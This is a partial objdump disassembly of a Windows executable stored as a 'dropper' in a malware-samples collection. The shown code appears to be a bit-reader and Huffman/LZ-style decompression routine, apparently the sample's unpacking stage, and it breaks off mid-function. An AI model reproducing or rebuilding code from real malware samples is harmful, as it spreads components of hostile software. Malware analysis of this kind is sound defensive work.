
malware_samples/dropper/3298e00ff1d3fa255b16997bc8a08e02e328898100ab758378be3ad43fba4bd6.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	33 c0                	xor    %eax,%eax
  401002:	56                   	push   %esi
  401003:	85 d2                	test   %edx,%edx
  401005:	8b f1                	mov    %ecx,%esi
  401007:	74 3d                	je     0x401046
  401009:	53                   	push   %ebx
  40100a:	55                   	push   %ebp
  40100b:	57                   	push   %edi
  40100c:	33 ff                	xor    %edi,%edi
  40100e:	8b ea                	mov    %edx,%ebp
  401010:	8b 56 1c             	mov    0x1c(%esi),%edx
  401013:	33 c9                	xor    %ecx,%ecx
  401015:	8a 0a                	mov    (%edx),%cl
  401017:	8b d9                	mov    %ecx,%ebx
  401019:	8a 4e 20             	mov    0x20(%esi),%cl
  40101c:	d3 eb                	shr    %cl,%ebx
  40101e:	8b cf                	mov    %edi,%ecx
  401020:	83 e3 01             	and    $0x1,%ebx
  401023:	d3 e3                	shl    %cl,%ebx
  401025:	8b 4e 20             	mov    0x20(%esi),%ecx
  401028:	0b c3                	or     %ebx,%eax
  40102a:	47                   	inc    %edi
  40102b:	85 c9                	test   %ecx,%ecx
  40102d:	75 0d                	jne    0x40103c
  40102f:	42                   	inc    %edx
  401030:	c7 46 20 07 00 00 00 	movl   $0x7,0x20(%esi)
  401037:	89 56 1c             	mov    %edx,0x1c(%esi)
  40103a:	eb 04                	jmp    0x401040
  40103c:	49                   	dec    %ecx
  40103d:	89 4e 20             	mov    %ecx,0x20(%esi)
  401040:	4d                   	dec    %ebp
  401041:	75 cd                	jne    0x401010
  401043:	5f                   	pop    %edi
  401044:	5d                   	pop    %ebp
  401045:	5b                   	pop    %ebx
  401046:	5e                   	pop    %esi
  401047:	c3                   	ret
  401048:	90                   	nop
  401049:	90                   	nop
  40104a:	90                   	nop
  40104b:	90                   	nop
  40104c:	90                   	nop
  40104d:	90                   	nop
  40104e:	90                   	nop
  40104f:	90                   	nop
  401050:	83 ec 38             	sub    $0x38,%esp
  401053:	53                   	push   %ebx
  401054:	55                   	push   %ebp
  401055:	56                   	push   %esi
  401056:	8b 74 24 48          	mov    0x48(%esp),%esi
  40105a:	57                   	push   %edi
  40105b:	8b ce                	mov    %esi,%ecx
  40105d:	8b 2e                	mov    (%esi),%ebp
  40105f:	8b 5e 30             	mov    0x30(%esi),%ebx
  401062:	83 fd 20             	cmp    $0x20,%ebp
  401065:	89 5c 24 10          	mov    %ebx,0x10(%esp)
  401069:	1b d2                	sbb    %edx,%edx
  40106b:	83 c2 03             	add    $0x3,%edx
  40106e:	e8 8d ff ff ff       	call   0x401000
  401073:	8b e8                	mov    %eax,%ebp
  401075:	8b ce                	mov    %esi,%ecx
  401077:	45                   	inc    %ebp
  401078:	8b d5                	mov    %ebp,%edx
  40107a:	e8 81 ff ff ff       	call   0x401000
  40107f:	8b d5                	mov    %ebp,%edx
  401081:	8b ce                	mov    %esi,%ecx
  401083:	89 46 14             	mov    %eax,0x14(%esi)
  401086:	e8 75 ff ff ff       	call   0x401000
  40108b:	03 46 14             	add    0x14(%esi),%eax
  40108e:	89 46 18             	mov    %eax,0x18(%esi)
  401091:	8b 46 24             	mov    0x24(%esi),%eax
  401094:	85 c0                	test   %eax,%eax
  401096:	74 2a                	je     0x4010c2
  401098:	8b 06                	mov    (%esi),%eax
  40109a:	33 ff                	xor    %edi,%edi
  40109c:	85 c0                	test   %eax,%eax
  40109e:	0f 86 31 01 00 00    	jbe    0x4011d5
  4010a4:	8b d5                	mov    %ebp,%edx
  4010a6:	8b ce                	mov    %esi,%ecx
  4010a8:	e8 53 ff ff ff       	call   0x401000
  4010ad:	89 03                	mov    %eax,(%ebx)
  4010af:	8b 06                	mov    (%esi),%eax
  4010b1:	47                   	inc    %edi
  4010b2:	83 c3 04             	add    $0x4,%ebx
  4010b5:	3b f8                	cmp    %eax,%edi
  4010b7:	72 eb                	jb     0x4010a4
  4010b9:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  4010bd:	e9 13 01 00 00       	jmp    0x4011d5
  4010c2:	8d 44 24 14          	lea    0x14(%esp),%eax
  4010c6:	6a 14                	push   $0x14
  4010c8:	50                   	push   %eax
  4010c9:	e8 f2 03 00 00       	call   0x4014c0
  4010ce:	8b 4e 1c             	mov    0x1c(%esi),%ecx
  4010d1:	8b 56 20             	mov    0x20(%esi),%edx
  4010d4:	8d 44 24 14          	lea    0x14(%esp),%eax
  4010d8:	89 4c 24 30          	mov    %ecx,0x30(%esp)
  4010dc:	50                   	push   %eax
  4010dd:	89 54 24 38          	mov    %edx,0x38(%esp)
  4010e1:	c7 44 24 3c 01 00 00 	movl   $0x1,0x3c(%esp)
  4010e8:	00 
  4010e9:	e8 62 ff ff ff       	call   0x401050
  4010ee:	83 3e 00             	cmpl   $0x0,(%esi)
  4010f1:	c7 44 24 4c 00 00 00 	movl   $0x0,0x4c(%esp)
  4010f8:	00 
  4010f9:	0f 86 be 00 00 00    	jbe    0x4011bd
  4010ff:	8b 7c 24 4c          	mov    0x4c(%esp),%edi
  401103:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  401107:	e8 54 01 00 00       	call   0x401260
  40110c:	8b 4c 24 4c          	mov    0x4c(%esp),%ecx
  401110:	83 f8 0f             	cmp    $0xf,%eax
  401113:	8d 1c 8b             	lea    (%ebx,%ecx,4),%ebx
  401116:	89 03                	mov    %eax,(%ebx)
  401118:	0f 86 88 00 00 00    	jbe    0x4011a6
  40111e:	83 c0 f0             	add    $0xfffffff0,%eax
  401121:	83 f8 03             	cmp    $0x3,%eax
  401124:	77 53                	ja     0x401179
  401126:	ff 24 85 4c 12 40 00 	jmp    *0x40124c(,%eax,4)
  40112d:	ba 02 00 00 00       	mov    $0x2,%edx
  401132:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  401136:	e8 c5 fe ff ff       	call   0x401000
  40113b:	8b f8                	mov    %eax,%edi
  40113d:	83 c7 04             	add    $0x4,%edi
  401140:	eb 37                	jmp    0x401179
  401142:	ba 04 00 00 00       	mov    $0x4,%edx
  401147:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  40114b:	e8 b0 fe ff ff       	call   0x401000
  401150:	8b f8                	mov    %eax,%edi
  401152:	83 c7 08             	add    $0x8,%edi
  401155:	eb 22                	jmp    0x401179
  401157:	ba 06 00 00 00       	mov    $0x6,%edx
  40115c:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  401160:	e8 9b fe ff ff       	call   0x401000
  401165:	8b f8                	mov    %eax,%edi
  401167:	83 c7 18             	add    $0x18,%edi
  40116a:	eb 0d                	jmp    0x401179
  40116c:	8b d5                	mov    %ebp,%edx
  40116e:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  401172:	e8 89 fe ff ff       	call   0x401000
  401177:	8b f8                	mov    %eax,%edi
  401179:	83 3b 13             	cmpl   $0x13,(%ebx)
  40117c:	75 04                	jne    0x401182
  40117e:	89 3b                	mov    %edi,(%ebx)
  401180:	eb 24                	jmp    0x4011a6
  401182:	4f                   	dec    %edi
  401183:	c7 03 00 00 00 00    	movl   $0x0,(%ebx)
  401189:	74 1b                	je     0x4011a6
  40118b:	8b 54 24 4c          	mov    0x4c(%esp),%edx
  40118f:	8b c3                	mov    %ebx,%eax
  401191:	03 d7                	add    %edi,%edx
  401193:	8b cf                	mov    %edi,%ecx
  401195:	89 54 24 4c          	mov    %edx,0x4c(%esp)
  401199:	83 c0 04             	add    $0x4,%eax
  40119c:	4f                   	dec    %edi
  40119d:	49                   	dec    %ecx
  40119e:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  4011a4:	75 f3                	jne    0x401199
  4011a6:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  4011aa:	8b 0e                	mov    (%esi),%ecx
  4011ac:	8b 5c 24 10          	mov    0x10(%esp),%ebx
  4011b0:	40                   	inc    %eax
  4011b1:	3b c1                	cmp    %ecx,%eax
  4011b3:	89 44 24 4c          	mov    %eax,0x4c(%esp)
  4011b7:	0f 82 46 ff ff ff    	jb     0x401103
  4011bd:	8b 54 24 30          	mov    0x30(%esp),%edx
  4011c1:	8b 44 24 34          	mov    0x34(%esp),%eax
  4011c5:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  4011c9:	89 56 1c             	mov    %edx,0x1c(%esi)
  4011cc:	51                   	push   %ecx
  4011cd:	89 46 20             	mov    %eax,0x20(%esi)
  4011d0:	e8 5b 03 00 00       	call   0x401530
  4011d5:	8b 06                	mov    (%esi),%eax
  4011d7:	33 ff                	xor    %edi,%edi
  4011d9:	85 c0                	test   %eax,%eax
  4011db:	76 3e                	jbe    0x40121b
  4011dd:	8b c3                	mov    %ebx,%eax
  4011df:	8b 56 28             	mov    0x28(%esi),%edx
  4011e2:	8d 0c 17             	lea    (%edi,%edx,1),%ecx
  4011e5:	33 d2                	xor    %edx,%edx
  4011e7:	8a 11                	mov    (%ecx),%dl
  4011e9:	c6 01 00             	movb   $0x0,(%ecx)
  4011ec:	8b 08                	mov    (%eax),%ecx
  4011ee:	83 f9 0f             	cmp    $0xf,%ecx
  4011f1:	77 0f                	ja     0x401202
  4011f3:	03 ca                	add    %edx,%ecx
  4011f5:	83 e1 0f             	and    $0xf,%ecx
  4011f8:	89 08                	mov    %ecx,(%eax)
  4011fa:	8b 4e 28             	mov    0x28(%esi),%ecx
  4011fd:	8a 10                	mov    (%eax),%dl
  4011ff:	88 14 0f             	mov    %dl,(%edi,%ecx,1)
  401202:	8b 08                	mov    (%eax),%ecx
  401204:	85 c9                	test   %ecx,%ecx
  401206:	74 09                	je     0x401211
  401208:	8b 56 14             	mov    0x14(%esi),%edx
  40120b:	8d 4c 0a ff          	lea    -0x1(%edx,%ecx,1),%ecx
  40120f:	89 08                	mov    %ecx,(%eax)
  401211:	8b 0e                	mov    (%esi),%ecx
  401213:	47                   	inc    %edi
  401214:	83 c0 04             	add    $0x4,%eax
  401217:	3b f9                	cmp    %ecx,%edi
  401219:	72 c4                	jb     0x4011df
  40121b:	8b 06                	mov    (%esi),%eax
  40121d:	33 d2                	xor    %edx,%edx
  40121f:	85 c0                	test   %eax,%eax
  401221:	76 19                	jbe    0x40123c
  401223:	33 c9                	xor    %ecx,%ecx
  401225:	8b c3                	mov    %ebx,%eax
  401227:	8b 7e 0c             	mov    0xc(%esi),%edi
  40122a:	8b 18                	mov    (%eax),%ebx
  40122c:	42                   	inc    %edx
  40122d:	83 c0 04             	add    $0x4,%eax
  401230:	89 1c 39             	mov    %ebx,(%ecx,%edi,1)
  401233:	8b 3e                	mov    (%esi),%edi
  401235:	83 c1 10             	add    $0x10,%ecx
  401238:	3b d7                	cmp    %edi,%edx
  40123a:	72 eb                	jb     0x401227
  40123c:	56                   	push   %esi
  40123d:	e8 2e 03 00 00       	call   0x401570
  401242:	5f                   	pop    %edi
  401243:	5e                   	pop    %esi
  401244:	5d                   	pop    %ebp
  401245:	5b                   	pop    %ebx
  401246:	83 c4 38             	add    $0x38,%esp
  401249:	c2 04 00             	ret    $0x4
  40124c:	2d 11 40 00 42       	sub    $0x42004011,%eax
  401251:	11 40 00             	adc    %eax,0x0(%eax)
  401254:	57                   	push   %edi
  401255:	11 40 00             	adc    %eax,0x0(%eax)
  401258:	6c                   	insb   (%dx),%es:(%edi)
  401259:	11 40 00             	adc    %eax,0x0(%eax)
  40125c:	90                   	nop
  40125d:	90                   	nop
  40125e:	90                   	nop
  40125f:	90                   	nop
  401260:	8b d1                	mov    %ecx,%edx
  401262:	56                   	push   %esi
  401263:	57                   	push   %edi
  401264:	8b 7a 08             	mov    0x8(%edx),%edi
  401267:	8b 72 1c             	mov    0x1c(%edx),%esi
  40126a:	8a 4a 20             	mov    0x20(%edx),%cl
  40126d:	8a 06                	mov    (%esi),%al
  40126f:	d2 e8                	shr    %cl,%al
  401271:	a8 01                	test   $0x1,%al
  401273:	74 05                	je     0x40127a
  401275:	8b 7f 0c             	mov    0xc(%edi),%edi
  401278:	eb 03                	jmp    0x40127d
  40127a:	8b 7f 08             	mov    0x8(%edi),%edi
  40127d:	8b 4a 20             	mov    0x20(%edx),%ecx
  401280:	85 c9                	test   %ecx,%ecx
  401282:	75 0d                	jne    0x401291
  401284:	46                   	inc    %esi
  401285:	c7 42 20 07 00 00 00 	movl   $0x7,0x20(%edx)
  40128c:	89 72 1c             	mov    %esi,0x1c(%edx)
  40128f:	eb 04                	jmp    0x401295
  401291:	49                   	dec    %ecx
  401292:	89 4a 20             	mov    %ecx,0x20(%edx)
  401295:	8b 47 08             	mov    0x8(%edi),%eax
  401298:	85 c0                	test   %eax,%eax
  40129a:	75 cb                	jne    0x401267
  40129c:	8b 72 0c             	mov    0xc(%edx),%esi
  40129f:	8b c7                	mov    %edi,%eax
  4012a1:	2b c6                	sub    %esi,%eax
  4012a3:	5f                   	pop    %edi
  4012a4:	c1 f8 04             	sar    $0x4,%eax
  4012a7:	5e                   	pop    %esi
  4012a8:	c3                   	ret
  4012a9:	90                   	nop
  4012aa:	90                   	nop
  4012ab:	90                   	nop
  4012ac:	90                   	nop
  4012ad:	90                   	nop
  4012ae:	90                   	nop
  4012af:	90                   	nop
  4012b0:	83 ec 38             	sub    $0x38,%esp
  4012b3:	53                   	push   %ebx
  4012b4:	8b 5c 24 44          	mov    0x44(%esp),%ebx
  4012b8:	55                   	push   %ebp
  4012b9:	8b 6c 24 4c          	mov    0x4c(%esp),%ebp
  4012bd:	56                   	push   %esi
  4012be:	57                   	push   %edi
  4012bf:	8b 7c 24 58          	mov    0x58(%esp),%edi
  4012c3:	8d 34 2b             	lea    (%ebx,%ebp,1),%esi
  4012c6:	89 74 24 10          	mov    %esi,0x10(%esp)
  4012ca:	8b 4f 10             	mov    0x10(%edi),%ecx
  4012cd:	8b 07                	mov    (%edi),%eax
  4012cf:	03 d9                	add    %ecx,%ebx
  4012d1:	85 c0                	test   %eax,%eax
  4012d3:	75 06                	jne    0x4012db
  4012d5:	c7 07 10 27 00 00    	movl   $0x2710,(%edi)
  4012db:	8b cd                	mov    %ebp,%ecx
  4012dd:	e8 3e 08 00 00       	call   0x401b20
  4012e2:	83 f8 15             	cmp    $0x15,%eax
  4012e5:	76 07                	jbe    0x4012ee
  4012e7:	b8 15 00 00 00       	mov    $0x15,%eax
  4012ec:	eb 07                	jmp    0x4012f5
  4012ee:	8b cd                	mov    %ebp,%ecx
  4012f0:	e8 2b 08 00 00       	call   0x401b20
  4012f5:	ba 01 00 00 00       	mov    $0x1,%edx
  4012fa:	8b c8                	mov    %eax,%ecx
  4012fc:	d3 e2                	shl    %cl,%edx
  4012fe:	4a                   	dec    %edx
  4012ff:	52                   	push   %edx
  401300:	57                   	push   %edi
  401301:	e8 4a 08 00 00       	call   0x401b50
  401306:	8b 47 08             	mov    0x8(%edi),%eax
  401309:	8d 54 24 14          	lea    0x14(%esp),%edx
  40130d:	c7 47 14 03 00 00 00 	movl   $0x3,0x14(%edi)
  401314:	c7 47 18 04 00 00 00 	movl   $0x4,0x18(%edi)
  40131b:	8d 04 c0             	lea    (%eax,%eax,8),%eax
  40131e:	c7 47 1c 05 00 00 00 	movl   $0x5,0x1c(%edi)
  401325:	8d 8c 00 01 01 00 00 	lea    0x101(%eax,%eax,1),%ecx
  40132c:	51                   	push   %ecx
  40132d:	52                   	push   %edx
  40132e:	e8 8d 01 00 00       	call   0x4014c0
  401333:	3b de                	cmp    %esi,%ebx
  401335:	c7 44 24 34 07 00 00 	movl   $0x7,0x34(%esp)
  40133c:	00 
  40133d:	8b 44 24 4c          	mov    0x4c(%esp),%eax
  401341:	89 44 24 30          	mov    %eax,0x30(%esp)
  401345:	0f 83 50 01 00 00    	jae    0x40149b
  40134b:	8d 44 24 14          	lea    0x14(%esp),%eax
  40134f:	c7 44 24 50 00 00 00 	movl   $0x0,0x50(%esp)
  401356:	00 
  401357:	50                   	push   %eax
  401358:	e8 f3 fc ff ff       	call   0x401050
  40135d:	83 3f 00             	cmpl   $0x0,(%edi)
  401360:	0f 84 0c 01 00 00    	je     0x401472
  401366:	3b de                	cmp    %esi,%ebx
  401368:	0f 83 04 01 00 00    	jae    0x401472
  40136e:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  401372:	e8 e9 fe ff ff       	call   0x401260
  401377:	8b c8                	mov    %eax,%ecx
  401379:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  40137f:	73 08                	jae    0x401389
  401381:	88 0b                	mov    %cl,(%ebx)
  401383:	43                   	inc    %ebx
  401384:	e9 d2 00 00 00       	jmp    0x40145b
  401389:	8b 47 08             	mov    0x8(%edi),%eax
  40138c:	81 e9 00 01 00 00    	sub    $0x100,%ecx
  401392:	8d 14 c0             	lea    (%eax,%eax,8),%edx
  401395:	d1 e2                	shl    $1,%edx
  401397:	3b ca                	cmp    %edx,%ecx
  401399:	75 09                	jne    0x4013a4
  40139b:	33 f6                	xor    %esi,%esi
  40139d:	bd 12 00 00 00       	mov    $0x12,%ebp
  4013a2:	eb 19                	jmp    0x4013bd
  4013a4:	8b c1                	mov    %ecx,%eax
  4013a6:	33 d2                	xor    %edx,%edx
  4013a8:	be 12 00 00 00       	mov    $0x12,%esi
  4013ad:	f7 f6                	div    %esi
  4013af:	b8 39 8e e3 38       	mov    $0x38e38e39,%eax
  4013b4:	8b ea                	mov    %edx,%ebp
  4013b6:	f7 e1                	mul    %ecx
  4013b8:	8b f2                	mov    %edx,%esi
  4013ba:	c1 ee 02             	shr    $0x2,%esi
  4013bd:	8b 14 ad 6c 32 40 00 	mov    0x40326c(,%ebp,4),%edx
  4013c4:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  4013c8:	e8 33 fc ff ff       	call   0x401000
  4013cd:	8b 0c ad 00 35 40 00 	mov    0x403500(,%ebp,4),%ecx
  4013d4:	03 c1                	add    %ecx,%eax
  4013d6:	83 fd 12             	cmp    $0x12,%ebp
  4013d9:	89 44 24 58          	mov    %eax,0x58(%esp)
  4013dd:	75 0e                	jne    0x4013ed
  4013df:	8b 57 0c             	mov    0xc(%edi),%edx
  4013e2:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  4013e6:	e8 15 fc ff ff       	call   0x401000
  4013eb:	eb 41                	jmp    0x40142e
  4013ed:	8b 14 b5 a0 31 40 00 	mov    0x4031a0(,%esi,4),%edx
  4013f4:	8d 4c 24 14          	lea    0x14(%esp),%ecx
  4013f8:	e8 03 fc ff ff       	call   0x401000
  4013fd:	03 04 b5 c0 33 40 00 	add    0x4033c0(,%esi,4),%eax
  401404:	85 f6                	test   %esi,%esi
  401406:	75 05                	jne    0x40140d
  401408:	8b 47 14             	mov    0x14(%edi),%eax
  40140b:	eb 21                	jmp    0x40142e
  40140d:	83 fe 01             	cmp    $0x1,%esi
  401410:	75 05                	jne    0x401417
  401412:	8b 47 18             	mov    0x18(%edi),%eax
  401415:	eb 0e                	jmp    0x401425
  401417:	83 fe 02             	cmp    $0x2,%esi
  40141a:	75 03                	jne    0x40141f
  40141c:	8b 47 1c             	mov    0x1c(%edi),%eax
  40141f:	8b 57 18             	mov    0x18(%edi),%edx
  401422:	89 57 1c             	mov    %edx,0x1c(%edi)
  401425:	8b 4f 14             	mov    0x14(%edi),%ecx
  401428:	89 47 14             	mov    %eax,0x14(%edi)
  40142b:	89 4f 18             	mov    %ecx,0x18(%edi)
  40142e:	8b 74 24 58          	mov    0x58(%esp),%esi
  401432:	3b c6                	cmp    %esi,%eax
  401434:	73 17                	jae    0x40144d
  401436:	8b d6                	mov    %esi,%edx
  401438:	4e                   	dec    %esi
  401439:	85 d2                	test   %edx,%edx
  40143b:	74 1e                	je     0x40145b
  40143d:	46                   	inc    %esi
  40143e:	8b cb                	mov    %ebx,%ecx
  401440:	2b c8                	sub    %eax,%ecx
  401442:	43                   	inc    %ebx
  401443:	4e                   	dec    %esi
  401444:	8a 11                	mov    (%ecx),%dl
  401446:	88 53 ff             	mov    %dl,-0x1(%ebx)
  401449:	75 f3                	jne    0x40143e
  40144b:	eb 0e                	jmp    0x40145b
  40144d:	8b cb                	mov    %ebx,%ecx
  40144f:	56                   	push   %esi
  401450:	2b c8                	sub    %eax,%ecx
  401452:	51                   	push   %ecx
  401453:	53                   	push   %ebx
  401454:	e8 77 08 00 00       	call   0x401cd0
  401459:	03 de                	add    %esi,%ebx
  40145b:	8b 44 24 50          	mov    0x50(%esp),%eax
  40145f:	8b 0f                	mov    (%edi),%ecx
  401461:	8b 74 24 10          	mov    0x10(%esp),%esi
  401465:	40                   	inc    %eax
  401466:	3b c1                	cmp    %ecx,%eax
  401468:	89 44 24 50          	mov    %eax,0x50(%esp)
  40146c:	0f 85 f4 fe ff ff    	jne    0x401366
  401472:	8b 57 24             	mov    0x24(%edi),%edx
  401475:	8b 6c 24 54          	mov    0x54(%esp),%ebp
  401479:	8b 47 20             	mov    0x20(%edi),%eax
  40147c:	52                   	push   %edx
  40147d:	8b 57 10             	mov    0x10(%edi),%edx
  401480:	8b cb                	mov    %ebx,%ecx
  401482:	2b ca                	sub    %edx,%ecx
  401484:	50                   	push   %eax
  401485:	2b ce                	sub    %esi,%ecx
  401487:	03 cd                	add    %ebp,%ecx
  401489:	51                   	push   %ecx
  40148a:	e8 e1 01 00 00       	call   0x401670
  40148f:	3b de                	cmp    %esi,%ebx
  401491:	0f 82 b4 fe ff ff    	jb     0x40134b
  401497:	8b 44 24 30          	mov    0x30(%esp),%eax
  40149b:	8b 54 24 4c          	mov    0x4c(%esp),%edx
  40149f:	2b c2                	sub    %edx,%eax
  4014a1:	8d 54 24 14          	lea    0x14(%esp),%edx
  4014a5:	40                   	inc    %eax
  4014a6:	52                   	push   %edx
  4014a7:	8b f0                	mov    %eax,%esi
  4014a9:	e8 82 00 00 00       	call   0x401530
  4014ae:	8b c6                	mov    %esi,%eax
  4014b0:	5f                   	pop    %edi
  4014b1:	5e                   	pop    %esi
  4014b2:	5d                   	pop    %ebp
  4014b3:	5b                   	pop    %ebx
  4014b4:	83 c4 38             	add    $0x38,%esp
  4014b7:	c2 10 00             	ret    $0x10
  4014ba:	90                   	nop
  4014bb:	90                   	nop
  4014bc:	90                   	nop
  4014bd:	90                   	nop
  4014be:	90                   	nop
  4014bf:	90                   	nop
  4014c0:	56                   	push   %esi
  4014c1:	57                   	push   %edi
  4014c2:	8b 7c 24 10          	mov    0x10(%esp),%edi
  4014c6:	8b 74 24 0c          	mov    0xc(%esp),%esi
  4014ca:	8b c7                	mov    %edi,%eax
  4014cc:	68 00 04 00 00       	push   $0x400
  4014d1:	83 e0 01             	and    $0x1,%eax
  4014d4:	03 c7                	add    %edi,%eax
  4014d6:	d1 e0                	shl    $1,%eax
  4014d8:	89 46 04             	mov    %eax,0x4(%esi)
  4014db:	e8 d0 07 00 00       	call   0x401cb0
  4014e0:	68 00 08 00 00       	push   $0x800
  4014e5:	89 46 10             	mov    %eax,0x10(%esi)
  4014e8:	e8 c3 07 00 00       	call   0x401cb0
  4014ed:	8b 4e 04             	mov    0x4(%esi),%ecx
  4014f0:	89 46 28             	mov    %eax,0x28(%esi)
  4014f3:	c1 e1 04             	shl    $0x4,%ecx
  4014f6:	51                   	push   %ecx
  4014f7:	e8 b4 07 00 00       	call   0x401cb0
  4014fc:	89 46 0c             	mov    %eax,0xc(%esi)
  4014ff:	33 c0                	xor    %eax,%eax
  401501:	68 00 20 00 00       	push   $0x2000
  401506:	89 3e                	mov    %edi,(%esi)
  401508:	89 46 08             	mov    %eax,0x8(%esi)
  40150b:	89 46 20             	mov    %eax,0x20(%esi)
  40150e:	89 46 24             	mov    %eax,0x24(%esi)
  401511:	e8 0a 07 00 00       	call   0x401c20
  401516:	68 00 20 00 00       	push   $0x2000
  40151b:	89 46 2c             	mov    %eax,0x2c(%esi)
  40151e:	e8 fd 06 00 00       	call   0x401c20
  401523:	89 46 30             	mov    %eax,0x30(%esi)
  401526:	8b c6                	mov    %esi,%eax
  401528:	5f                   	pop    %edi
  401529:	5e                   	pop    %esi
  40152a:	c2 08 00             	ret    $0x8
  40152d:	90                   	nop
  40152e:	90                   	nop
  40152f:	90                   	nop
  401530:	56                   	push   %esi
  401531:	8b 74 24 08          	mov    0x8(%esp),%esi
  401535:	8b 46 0c             	mov    0xc(%esi),%eax
  401538:	50                   	push   %eax
  401539:	e8 02 07 00 00       	call   0x401c40
  40153e:	8b 4e 10             	mov    0x10(%esi),%ecx
  401541:	51                   	push   %ecx
  401542:	e8 f9 06 00 00       	call   0x401c40
  401547:	8b 56 28             	mov    0x28(%esi),%edx
  40154a:	52                   	push   %edx
  40154b:	e8 f0 06 00 00       	call   0x401c40
  401550:	8b 46 2c             	mov    0x2c(%esi),%eax
  401553:	50                   	push   %eax
  401554:	e8 e7 06 00 00       	call   0x401c40
  401559:	8b 4e 30             	mov    0x30(%esi),%ecx
  40155c:	51                   	push   %ecx
  40155d:	e8 de 06 00 00       	call   0x401c40
  401562:	5e                   	pop    %esi
  401563:	c2 04 00             	ret    $0x4
  401566:	90                   	nop
  401567:	90                   	nop
  401568:	90                   	nop
  401569:	90                   	nop
  40156a:	90                   	nop
  40156b:	90                   	nop
  40156c:	90                   	nop
  40156d:	90                   	nop
  40156e:	90                   	nop
  40156f:	90                   	nop
  401570:	83 ec 08             	sub    $0x8,%esp
  401573:	53                   	push   %ebx
  401574:	55                   	push   %ebp
  401575:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  401579:	56                   	push   %esi
  40157a:	57                   	push   %edi
  40157b:	b9 00 08 00 00       	mov    $0x800,%ecx
  401580:	8b 55 2c             	mov    0x2c(%ebp),%edx
  401583:	33 c0                	xor    %eax,%eax
  401585:	8b fa                	mov    %edx,%edi
  401587:	f3 ab                	rep stos %eax,%es:(%edi)
  401589:	8b 45 00             	mov    0x0(%ebp),%eax
  40158c:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  401590:	89 44 24 10          	mov    %eax,0x10(%esp)
  401594:	8b 7c 24 10          	mov    0x10(%esp),%edi
  401598:	8b 75 0c             	mov    0xc(%ebp),%esi
  40159b:	c1 e7 04             	shl    $0x4,%edi
  40159e:	8b c6                	mov    %esi,%eax
  4015a0:	c7 44 24 14 00 00 00 	movl   $0x0,0x14(%esp)
  4015a7:	00 
  4015a8:	8d 1c 37             	lea    (%edi,%esi,1),%ebx
  4015ab:	3b c3                	cmp    %ebx,%eax
  4015ad:	0f 83 9c 00 00 00    	jae    0x40164f
  4015b3:	8b 18                	mov    (%eax),%ebx
  4015b5:	85 db                	test   %ebx,%ebx
  4015b7:	74 57                	je     0x401610
  4015b9:	8b 6c 24 14          	mov    0x14(%esp),%ebp
  4015bd:	45                   	inc    %ebp
  4015be:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  4015c2:	8b 2c 9a             	mov    (%edx,%ebx,4),%ebp
  4015c5:	85 ed                	test   %ebp,%ebp
  4015c7:	74 3a                	je     0x401603
  4015c9:	8d 0c 37             	lea    (%edi,%esi,1),%ecx
  4015cc:	8b 74 24 10          	mov    0x10(%esp),%esi
  4015d0:	46                   	inc    %esi
  4015d1:	83 c7 10             	add    $0x10,%edi
  4015d4:	89 74 24 10          	mov    %esi,0x10(%esp)
  4015d8:	8b f3                	mov    %ebx,%esi
  4015da:	4e                   	dec    %esi
  4015db:	89 31                	mov    %esi,(%ecx)
  4015dd:	8b 30                	mov    (%eax),%esi
  4015df:	8b 34 b2             	mov    (%edx,%esi,4),%esi
  4015e2:	89 41 0c             	mov    %eax,0xc(%ecx)
  4015e5:	89 71 08             	mov    %esi,0x8(%ecx)
  4015e8:	8b 30                	mov    (%eax),%esi
  4015ea:	8b 34 b2             	mov    (%edx,%esi,4),%esi
  4015ed:	89 4e 04             	mov    %ecx,0x4(%esi)
  4015f0:	8b 30                	mov    (%eax),%esi
  4015f2:	c7 04 b2 00 00 00 00 	movl   $0x0,(%edx,%esi,4)
  4015f9:	89 48 04             	mov    %ecx,0x4(%eax)
  4015fc:	83 39 00             	cmpl   $0x0,(%ecx)
  4015ff:	74 1e                	je     0x40161f
  401601:	eb 03                	jmp    0x401606
  401603:	89 04 9a             	mov    %eax,(%edx,%ebx,4)
  401606:	8b 6c 24 1c          	mov    0x1c(%esp),%ebp
  40160a:	c7 00 00 00 00 00    	movl   $0x0,(%eax)
  401610:	8b 75 0c             	mov    0xc(%ebp),%esi
  401613:	83 c0 10             	add    $0x10,%eax
  401616:	8d 1c 37             	lea    (%edi,%esi,1),%ebx
  401619:	3b c3                	cmp    %ebx,%eax
  40161b:	72 96                	jb     0x4015b3
  40161d:	eb 04                	jmp    0x401623
  40161f:	8b 6c 24 1c          	mov    0x1c(%esp),%ebp
  401623:	83 7c 24 14 01       	cmpl   $0x1,0x14(%esp)
  401628:	75 25                	jne    0x40164f
  40162a:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  40162e:	8b 45 0c             	mov    0xc(%ebp),%eax
  401631:	c1 e1 04             	shl    $0x4,%ecx
  401634:	03 c8                	add    %eax,%ecx
  401636:	c7 01 00 00 00 00    	movl   $0x0,(%ecx)
  40163c:	8b 42 04             	mov    0x4(%edx),%eax
  40163f:	89 41 08             	mov    %eax,0x8(%ecx)
  401642:	c7 41 0c 00 00 00 00 	movl   $0x0,0xc(%ecx)
  401649:	8b 42 04             	mov    0x4(%edx),%eax
  40164c:	89 48 04             	mov    %ecx,0x4(%eax)
  40164f:	83 39 00             	cmpl   $0x0,(%ecx)
  401652:	0f 85 3c ff ff ff    	jne    0x401594
  401658:	5f                   	pop    %edi
  401659:	89 4d 08             	mov    %ecx,0x8(%ebp)
  40165c:	5e                   	pop    %esi
  40165d:	5d                   	pop    %ebp
  40165e:	c7 41 04 00 00 00 00 	movl   $0x0,0x4(%ecx)
  401665:	5b                   	pop    %ebx
